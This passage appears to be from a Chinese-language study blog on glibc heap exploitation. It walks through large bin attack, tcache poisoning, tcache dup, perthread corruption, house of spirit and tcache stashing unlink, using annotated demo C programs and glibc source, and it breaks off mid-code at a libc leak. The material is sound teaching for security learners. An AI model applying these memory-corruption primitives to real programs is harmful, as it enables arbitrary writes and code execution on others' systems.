class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Finally, we allocate the third large chunk on the heap at: %p\n&quot;</span>, p3 - <span class="hljs-number">2</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;And allocate another fastbin chunk in order to avoid consolidating the top chunk with&quot;</span><br>                    <span class="hljs-string">&quot; the third large chunk during the free()\n\n&quot;</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x20</span>);<br><span class="hljs-comment">//以上总结：分配了p1,p2,p3大小分配为0x420,0x500,0x500(中间0x20堆块起保护作用，防止合并)</span><br>    <span class="hljs-built_in">free</span>(p1);<br>    <span class="hljs-built_in">free</span>(p2);<br><span class="hljs-comment">//free掉p1,p2，此时在unsorted bin中</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;We free the first and second large chunks now and they will be inserted in the unsorted bin:&quot;</span><br>                    <span class="hljs-string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>,<br>            (<span class="hljs-type">void</span> *)(p2 - <span class="hljs-number">2</span>), (<span class="hljs-type">void</span> *)(p2[<span class="hljs-number">0</span>]));<br><br>    <span class="hljs-type">void</span>* p4 = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<span class="hljs-comment">//这一句做了很多事：1.由于这里nalloc了但没有满足要求的，所以将p1放入small bins中，将p2放入largebin中 2.现在unsorted bin空，从smallbin中分配，分配了0x90，并且将剩下的chunk(0x330-0xa0)放入unsorted bin中，所以现在unsorted bin中有一个chunk：0x290，largebin中也有一个chunk：0x410</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now, we allocate a chunk with a size smaller than the freed first large chunk. This will move the&quot;</span><br>                    <span class="hljs-string">&quot; freed second large chunk into the large bin freelist, use parts of the freed first large chunk for allocation&quot;</span><br>                    <span class="hljs-string">&quot;, and reinsert the remaining of the freed first large chunk into the unsorted bin:&quot;</span><br>                    <span class="hljs-string">&quot; [ %p ]\n\n&quot;</span>,<br>            (<span class="hljs-type">void</span> *)((<span class="hljs-type">char</span> *)p1 + <span class="hljs-number">0x90</span>));<br><br>    <span class="hljs-built_in">free</span>(p3);<span class="hljs-comment">//p3进入unsortedbin中，此时unsortbin中有两个空闲chunk，从头到尾分配时p3(0x410)，那个分割的chunk(0x290)</span><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now, we free the third large chunk and it will be inserted in the unsorted bin:&quot;</span><br>                    <span class="hljs-string">&quot; [ %p &lt;--&gt; %p ]\n\n&quot;</span>,<br>            (<span class="hljs-type">void</span> *)(p3 - <span class="hljs-number">2</span>), (<span class="hljs-type">void</span> *)(p3[<span class="hljs-number">0</span>]));<br><br>    <span class="hljs-comment">//------------VULNERABILITY-----------</span><br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Now emulating a vulnerability that can overwrite the freed second large chunk&#x27;s \&quot;size\&quot;&quot;</span><br>                    <span class="hljs-string">&quot; as well as its \&quot;bk\&quot; and \&quot;bk_nextsize\&quot; pointers\n&quot;</span>);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Basically, we decrease the size of the freed second large chunk to force malloc to insert the freed third large chunk&quot;</span><br>                    <span class="hljs-string">&quot; at the head of the large bin freelist. To overwrite the stack variables, we set \&quot;bk\&quot; to 16 bytes before stack_var1 and&quot;</span><br>                    <span class="hljs-string">&quot; \&quot;bk_nextsize\&quot; to 32 bytes before stack_var2\n\n&quot;</span>);<br><span class="hljs-comment">//开始构造，p2是那个放到largebin中的chunk</span><br>    p2[<span class="hljs-number">-1</span>] = <span class="hljs-number">0x3f1</span>; <span class="hljs-comment">//size</span><br>    p2[<span class="hljs-number">0</span>] = <span class="hljs-number">0</span>; <span class="hljs-comment">//fd</span><br>    p2[<span class="hljs-number">2</span>] = <span class="hljs-number">0</span>; <span class="hljs-comment">//fd_nextsize</span><br>    p2[<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var1 - <span class="hljs-number">2</span>); <span class="hljs-comment">//bk，指向stack_var1-0x10的位置</span><br>    p2[<span class="hljs-number">3</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var2 - <span class="hljs-number">4</span>);<span class="hljs-comment">//bk_nextsize，指向stack_var2-0x20的位置，修改后结构图如下图</span><br><br>    <span class="hljs-comment">//------------------------------------</span><br><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<span class="hljs-comment">//与第一个malloc(0x90)过程类似，从unsorted bin中拿出最后一个chunk放入smallbin中，接着p3要被放入到largebin中，此时会对p2,p3大小比较很明显p2v0x3F0小于p3 0x510，这里结合源码写在下面</span><br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;Let&#x27;s malloc again, so the freed third large chunk being inserted into the large bin freelist.&quot;</span><br>                    <span class="hljs-string">&quot; During this time, targets should have already been rewritten:\n&quot;</span>);<br><br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var1 (%p): %p\n&quot;</span>, &amp;stack_var1, (<span class="hljs-type">void</span> *)stack_var1);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;stack_var2 (%p): %p\n&quot;</span>, &amp;stack_var2, (<span class="hljs-type">void</span> *)stack_var2);<br><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>p2修改后</p><p><img src="/2025/03/19/%E5%A0%86%E7%9A%84%E6%94%BB%E5%87%BB/1744390744972.png" alt="修改后"></p><p>74行，结合2.23源码进行分析</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">//前情提要p2&lt;p3,p3要被放到largebin中,p2本就在largebin中</span><br>                      <span class="hljs-keyword">if</span> ((<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) size == (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>) fwd-&gt;size)<br>                        <span class="hljs-comment">/* Always insert in the second position.  */</span><br>                        fwd = fwd-&gt;fd;<br>                      <span class="hljs-keyword">else</span><span class="hljs-comment">//进入这里的分支</span><br>                        &#123;<br>                          victim-&gt;fd_nextsize = fwd;<span class="hljs-comment">//vivtim是unsortedbin中，即将被放入largebin中的堆块(p3),bwd是最近被放进largebin中的chunk(p2)，这一句将p3-&gt;fd_nextsize=p2</span><br>                          victim-&gt;bk_nextsize = fwd-&gt;bk_nextsize;<span class="hljs-comment">//p2-&gt;bk_nextsize被我们设置成stack_var-0x20的地址，所以p3-&gt;bk_nextsize指向它,p3-&gt;bk_nextsize=p2-&gt;bk_nextsize=stack_var2-0x20</span><br>                          fwd-&gt;bk_nextsize = victim;<span class="hljs-comment">//p2-&gt;bk_nextsize指向p3</span><br>                          victim-&gt;bk_nextsize-&gt;fd_nextsize = victim;<span class="hljs-comment">//将stack_var2-0x20-&gt;fd_nextsize，也就是stack_var2的地址，将其变成p3头指针</span><br>                        &#125;<br>                      bck = fwd-&gt;bk;<span class="hljs-comment">//等价于(fwd-bk)-&gt;fd=victim 也就是stack_var1-0x10-&gt;fd=victim,修改了var1的值，流程走完，利用完毕!!</span><br>                    &#125;<br>                &#125;<br>              <span class="hljs-keyword">else</span><br>                victim-&gt;fd_nextsize = victim-&gt;bk_nextsize = victim;<br>            &#125;<br></code></pre></td></tr></table></figure><h2 id="总结-5"><a href="#总结-5" class="headerlink" title="总结"></a>总结</h2><p>主要利用两个chunk，大的p3，小的p2，通过伪造<code>p2-&gt;bk,p2-&gt;bk_nextsize</code>，分别指向<code>target-0x10,target-0x20</code>放到largebin里(在此之前largebin最好为空)，而大堆块malloc后进入largebin，<strong>实现将p3头指针赋值给target1,target2</strong></p><p>how2heap 中也说了，large bin attack 是未来更深入的利用。现在我们来总结一下利用的条件：</p><ul><li>可以修改一个 large bin chunk 的 data</li><li>从 unsorted bin 中来的 large bin chunk 要紧跟在被构造过的 chunk 的后面</li><li>通过 large bin attack 可以辅助 Tcache Stash Unlink+ 攻击</li><li>可以修改 _IO_list_all 便于伪造 _IO_FILE 结构体进行 FSOP。</li></ul><h1 id="Tcache-attack"><a href="#Tcache-attack" class="headerlink" title="Tcache attack"></a>Tcache attack</h1><h2 id="overview"><a href="#overview" class="headerlink" title="overview"></a>overview</h2><p>tcache中新增了两个结构体，<code>tcache_entry</code>和<code>tcache_perthread_struct</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/* We overlay this structure on the user-data portion of a chunk when the chunk is stored in the per-thread cache.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_entry</span> *<span class="hljs-title">next</span>;</span><br>&#125; tcache_entry;<br><br><span class="hljs-comment">/* There is one of these for each thread, which contains the per-thread cache (hence &quot;tcache_perthread_struct&quot;).  Keeping overall size low is mildly important.  Note that COUNTS and ENTRIES are redundant (we could have just counted the linked list each time), this is for performance reasons.  */</span><br><span class="hljs-keyword">typedef</span> <span class="hljs-class"><span class="hljs-keyword">struct</span> <span class="hljs-title">tcache_perthread_struct</span></span><br><span class="hljs-class">&#123;</span><br>  <span class="hljs-type">char</span> counts[TCACHE_MAX_BINS];<br>  tcache_entry *entries[TCACHE_MAX_BINS];<br>&#125; tcache_perthread_struct;<br><br><span class="hljs-type">static</span> __thread tcache_perthread_struct *tcache = <span class="hljs-literal">NULL</span>;<br></code></pre></td></tr></table></figure><p>其中重要的两个函数<code>tcache_get()</code>，<code>tcache_put()</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> <span class="hljs-type">void</span><br><span class="hljs-title function_">tcache_put</span> <span class="hljs-params">(mchunkptr chunk, <span class="hljs-type">size_t</span> tc_idx)</span><br>&#123;<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<br>  e-&gt;next = tcache-&gt;entries[tc_idx];<br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>&#125;<br><br><span class="hljs-type">static</span> <span class="hljs-type">void</span> *<br><span class="hljs-title function_">tcache_get</span> <span class="hljs-params">(<span class="hljs-type">size_t</span> tc_idx)</span><br>&#123;<br>  tcache_entry *e = tcache-&gt;entries[tc_idx];<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<br>  assert (tcache-&gt;entries[tc_idx] &gt; <span class="hljs-number">0</span>);<br>  tcache-&gt;entries[tc_idx] = e-&gt;next;<br>  --(tcache-&gt;counts[tc_idx]);<br>  <span class="hljs-keyword">return</span> (<span class="hljs-type">void</span> *) e;<br>&#125;<br></code></pre></td></tr></table></figure><p>这两个函数再<code>_int_free</code>和<code>__libc_malloc</code>开头被调用</p><p>tcache在分配大小&lt;&#x3D;<code>0x408</code>并且给定大小的tcachebin没有满时掉哟个</p><p>一个tcachebin中最大快数<code>mp_.tcache_count</code>是7</p><p>在<code>tcache_get</code>中，仅检查了<code>tc_idx</code>，可以当作一个类似于fastbin的单独链表，只是它的检查没有fastbin那么复杂，仅检查<code>tcache-&gt;entries[tc_idx] = e-&gt;next;</code></p><h2 id="usage"><a href="#usage" class="headerlink" title="usage"></a>usage</h2><ul><li>释放</li></ul><p>在<code>free</code>函数处理的最先部分，首先检查对齐情况和前后堆块的释放情况，然后就是<code>tcache</code></p><ul><li><p>申请</p><p>在<code>malloc</code>中有多处会将内存块移入tcache中</p><ul><li>申请内存块符合<code>fastbin</code>大小 且 在<code>fastbin</code>中找到可用空闲块，会将该fastbin链上的其他内存块移到<code>tcache</code>中</li><li>申请的内存块符合 <code>smallbin </code>大小 且 在 <code>smallbin </code>内找到可用的空闲块时，会把该 <code>smallbin </code>链上的其他内存块放入 <code>tcache </code>中</li><li>当在 <code>unsorted bin </code>链上循环处理时，当找到大小合适的链时，并不直接返回，而是先放到 <code>tcache </code>中</li></ul></li><li><p><code>tcache</code>取出：在内存申请的开始，会先根据申请大小看<code>tcache</code>中是否存在对应的内存块，如果存在就直接返回，否则再<code>_int_malloc</code></p></li><li><p>在循环处理<code>unsorted bin</code>内存块<strong>时</strong>，如果达到放入<code>unsortedbin</code>块的最大数量，则立即返回。默认值0，表示不存在上限</p></li><li><p>在循环处理<code>unsorted bin</code>内存块<strong>后</strong>，如果之前曾放入过<code>tcache</code>，则会取出一个并返回</p></li></ul><h2 id="tcache-poisoning"><a href="#tcache-poisoning" class="headerlink" title="tcache poisoning"></a>tcache poisoning</h2><h3 id="原理-8"><a href="#原理-8" class="headerlink" title="原理"></a>原理</h3><p>通过覆盖<code>tcache</code>中的<code>next</code>，不需要伪造任何<code>chunk</code>即可实现<code>malloc</code>到任何地址</p><h3 id="利用"><a href="#利用" class="headerlink" title="利用"></a>利用</h3><p><code>tcache</code>的<code>next</code>指针和<code>fd</code>指针在同一个位置</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">size_t</span> stack_var;<br><span class="hljs-type">intptr_t</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);<br><span class="hljs-built_in">free</span>(a);<br>a[<span class="hljs-number">0</span>] = (<span class="hljs-type">intptr_t</span>)&amp;stack_var;<br><span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;1st malloc(128): %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>));<br><span class="hljs-type">intptr_t</span> *b = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">128</span>);<br></code></pre></td></tr></table></figure><h3 id="总结-6"><a href="#总结-6" class="headerlink" title="总结"></a>总结</h3><p>跟<code>fastbin</code>类似，将一个<code>free</code>在<code>tcache</code>中的块的<code>next</code>修改成目标地址，两次<code>free</code>就能得到目标地址的内存块</p><h2 id="tcache-dup"><a href="#tcache-dup" class="headerlink" title="tcache dup"></a>tcache dup</h2><h3 id="原理-9"><a href="#原理-9" class="headerlink" title="原理"></a>原理</h3><p><code>tcache_put</code>的检查不严谨，大幅提高性能的同时安全性也下降了许多</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">static</span> __always_inline <span class="hljs-type">void</span><br><span class="hljs-title function_">tcache_put</span> <span class="hljs-params">(mchunkptr chunk, <span class="hljs-type">size_t</span> tc_idx)</span><br>&#123;<br>  tcache_entry *e = (tcache_entry *) chunk2mem (chunk);<br>  assert (tc_idx &lt; TCACHE_MAX_BINS);<br>  e-&gt;next = tcache-&gt;entries[tc_idx];<br>  tcache-&gt;entries[tc_idx] = e;<br>  ++(tcache-&gt;counts[tc_idx]);<br>&#125;<br></code></pre></td></tr></table></figure><p>但是2.29版本以后引进了对<code>double free</code>的检查</p><h3 id="利用-1"><a href="#利用-1" class="headerlink" title="利用"></a>利用</h3><p>直接两次<code>free</code>同一个块即可形成<code>cycliced list</code></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">8</span>);<br><span class="hljs-built_in">free</span>(a);<br><span class="hljs-built_in">free</span>(a);<br></code></pre></td></tr></table></figure><h2 id="tcache-perthread-corruption"><a href="#tcache-perthread-corruption" class="headerlink" title="tcache perthread corruption"></a>tcache perthread corruption</h2><h3 id="原理-10"><a href="#原理-10" class="headerlink" title="原理"></a>原理</h3><p><code>tcache_perthread_struct</code> 是整个 <code>tcache </code>的管理结构，如果能控制这个结构体，那么无论我们 <code>malloc </code>的 <code>size </code>是多少，地址都是可控的。 </p><h3 id="利用-2"><a href="#利用-2" class="headerlink" title="利用"></a>利用</h3><p>假设此时有堆排布情况如下</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs gherkin">tcache_    +------------+<br>\perthread |<span class="hljs-string">......      </span>|<br>\_struct   +------------+<br>           |<span class="hljs-string">counts[i]   </span>|<br>           +------------+<br>           |<span class="hljs-string">......      </span>|<span class="hljs-string">          +----------+</span><br><span class="hljs-string">           +------------+          </span>|<span class="hljs-string">header    </span>|<br>           |<span class="hljs-string">entries[i]  </span>|<span class="hljs-string">---------&gt;+----------+</span><br><span class="hljs-string">           +------------+          </span>|<span class="hljs-string">NULL      </span>|<br>           |<span class="hljs-string">......      </span>|<span class="hljs-string">          +----------+</span><br><span class="hljs-string">           </span>|<span class="hljs-string">            </span>|<span class="hljs-string">          </span>|<span class="hljs-string">          </span>|<br>           +------------+          +----------+<br></code></pre></td></tr></table></figure><p>通过一些手段（比如 <code>tcache posioning</code> ），我们将其改为了</p><figure class="highlight jboss-cli"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs jboss-cli">tcache_    +<span class="hljs-params">------------</span>+&lt;<span class="hljs-params">---------------------------</span>+<br>\perthread |<span class="hljs-string">......</span>      |                            |<br>\_struct   +<span class="hljs-params">------------</span>+                            |<br>           |counts[i]   |                            |<br>           +<span class="hljs-params">------------</span>+                            |<br>           |<span class="hljs-string">......</span>      |          +<span class="hljs-params">----------</span>+      |<br>           +<span class="hljs-params">------------</span>+          |header    |      |<br>           |entries[i]  |<span class="hljs-params">---------</span>&gt;+<span class="hljs-params">----------</span>+      |<br>           +<span class="hljs-params">------------</span>+          |target    |<span class="hljs-params">------</span>+<br>           |<span class="hljs-string">......</span>      |          +<span class="hljs-params">----------</span>+<br>           |            |          |          |<br>           +<span class="hljs-params">------------</span>+          +<span class="hljs-params">----------</span>+<br></code></pre></td></tr></table></figure><p>这样我们就可以通过两次<code>malloc</code>就返回了  <code>tcache_perthread_struct</code> 的地址，就可以控制整个 <code>tcache </code>了。</p><p><strong>因为 tcache_perthread_struct 也在堆上，因此这种方法一般只需要 partial overwrite 就可以达到目的。</strong></p><h2 id="tcache-house-of-spirit"><a href="#tcache-house-of-spirit" class="headerlink" title="tcache house of spirit"></a>tcache house of spirit</h2><h3 id="原理-11"><a href="#原理-11" class="headerlink" title="原理"></a>原理</h3><p>由于<code>tcache_put()</code>检查不严格，在释放的时候没有检查这个指针是否真的是对上<code>malloc</code>来的指针，我们通过伪造一个<code>fake chunk</code>将这个指针释放掉这个地址就会进入<code>tcache</code>中，而后再<code>malloc</code>就能获取这个地址</p><h3 id="利用-3"><a href="#利用-3" class="headerlink" title="利用"></a>利用</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">1</span>);<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> *a; <span class="hljs-comment">//pointer that will be overwritten</span><br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> <span class="hljs-type">long</span> fake_chunks[<span class="hljs-number">10</span>]; <span class="hljs-comment">//fake chunk region</span><br>    fake_chunks[<span class="hljs-number">1</span>] = <span class="hljs-number">0x40</span>; <span class="hljs-comment">// this is the size</span><br>    a = &amp;fake_chunks[<span class="hljs-number">2</span>];<br>    <span class="hljs-built_in">free</span>(a);<br>    <span class="hljs-built_in">fprintf</span>(<span class="hljs-built_in">stderr</span>, <span class="hljs-string">&quot;malloc(0x30): %p\n&quot;</span>, <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x30</span>));<br>&#125;<br></code></pre></td></tr></table></figure><p>在free(a)后</p><p><img src="/2025/03/19/%E5%A0%86%E7%9A%84%E6%94%BB%E5%87%BB/1745511150245.png"></p><h2 id="smallbin-unlink"><a href="#smallbin-unlink" class="headerlink" title="smallbin unlink"></a>smallbin unlink</h2><p>在 smallbin 中包含有空闲块的时候，会同时将同大小的其他空闲块，放入 tcache 中，此时也会出现解链操作，但相比于 unlink 宏，缺少了链完整性校验。因此，原本 unlink 操作在该条件下也可以使用。</p><h2 id="tcache-stashing-unlink-attack"><a href="#tcache-stashing-unlink-attack" class="headerlink" title="tcache stashing unlink attack"></a>tcache stashing unlink attack</h2><h3 id="原理-12"><a href="#原理-12" class="headerlink" title="原理"></a>原理</h3><p>在<code>tcachebin</code>没满，从<code>smallbin</code>中分配内存且<code>smallbin</code>中有空闲<code>chunk</code>时，在获取到一个<code>smallbin</code>后<code>smallbin</code>任然有空闲<code>chunk</code>，<code>glibc</code>会将<code>smallbin</code>中的<code>chunk</code>批量转移到tcache中</p><p>我们通过伪造<code>smallbin</code>的<code>bk</code>为<code>target addr</code>，其可以在任意地址上写一个<code>libc</code>地址（类似<code>unsorted bin attack</code>的效果），构造得当也可分配<code>fake chunk</code>到任意地址</p><h3 id="利用-4"><a href="#利用-4" class="headerlink" title="利用"></a>利用</h3><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span>&#123;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> stack_var[<span class="hljs-number">0x10</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *chunk_lis[<span class="hljs-number">0x10</span>] = &#123;<span class="hljs-number">0</span>&#125;;<br>    <span class="hljs-type">unsigned</span> <span class="hljs-type">long</span> *target;<br>    <span class="hljs-comment">// stack_var emulate the fake_chunk we want to alloc </span><br>    stack_var[<span class="hljs-number">3</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)(&amp;stack_var[<span class="hljs-number">2</span>]);<span class="hljs-comment">//伪造成双向链表通过检查</span><br>    <span class="hljs-comment">//now we malloc 9 chunks</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">0</span>;i &lt; <span class="hljs-number">9</span>;i++)&#123;<br>        chunk_lis[i] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>*)<span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br>    &#125;<span class="hljs-comment">//分配9个</span><br>    <span class="hljs-comment">//put 7 tcache</span><br>    <span class="hljs-keyword">for</span>(<span class="hljs-type">int</span> i = <span class="hljs-number">3</span>;i &lt; <span class="hljs-number">9</span>;i++)&#123;<br>        <span class="hljs-built_in">free</span>(chunk_lis[i]);<br>    &#125;<span class="hljs-comment">//将345678free到tcache中，此时tcache中有6个还没到7，没满</span><br>    <span class="hljs-comment">//last tcache bin</span><br>    <span class="hljs-built_in">free</span>(chunk_lis[<span class="hljs-number">1</span>]);<span class="hljs-comment">//填满tcachebin</span><br>    <span class="hljs-comment">//now they are put into unsorted bin</span><br>    <span class="hljs-built_in">free</span>(chunk_lis[<span class="hljs-number">0</span>]);<span class="hljs-comment">//进入unsortedbin</span><br>    <span class="hljs-built_in">free</span>(chunk_lis[<span class="hljs-number">2</span>]);<span class="hljs-comment">//同上一句，并且和原本unsortedbin中的chunk合并</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0xa0</span>);<span class="hljs-comment">//&gt;0x90，分割，剩下的进入smallbin</span><br>    <span class="hljs-comment">//now 5 tcache bins</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);<span class="hljs-comment">//分配掉两个，此时tcache中剩5</span><br>    chunk_lis[<span class="hljs-number">2</span>][<span class="hljs-number">1</span>] = (<span class="hljs-type">unsigned</span> <span class="hljs-type">long</span>)stack_var;<span class="hljs-comment">//伪造指针</span><br>    <span class="hljs-built_in">calloc</span>(<span class="hljs-number">1</span>,<span class="hljs-number">0x90</span>);<span class="hljs-comment">//触发攻击，clloac会绕过tcache，直接从smallbin分配，此时满足条件，会将smallbin中的chunk进入tcache，此时伪造的就进入了tcache中而且在链表头</span><br>    <span class="hljs-comment">//malloc and return our fake chunk on stack</span><br>    target = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x90</span>);   <span class="hljs-comment">//分配到fake chunk地址附近的chunk</span><br>     <span class="hljs-comment">//其 fd 指向下一个空闲块，在 unlink 过程中 bck-&gt;fd=bin 的赋值操作使得 target_addr+0x10 处写入了一个 libc 地址。</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="libc-leak"><a href="#libc-leak" class="headerlink" title="libc leak"></a>libc leak</h2><p>在以前的libc版本，我们只需要</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdlib.h&gt;</span></span><br><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">long</span> *a = <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x1000</span>);<span class="hljs-comment">//确保进入unsortedbin</span><br>    <span class="hljs-built_in">malloc</span>(<span class="hljs-number">0x10</span>);<span class="hljs-comment">//防止与top chunk合并</span><br>    <span 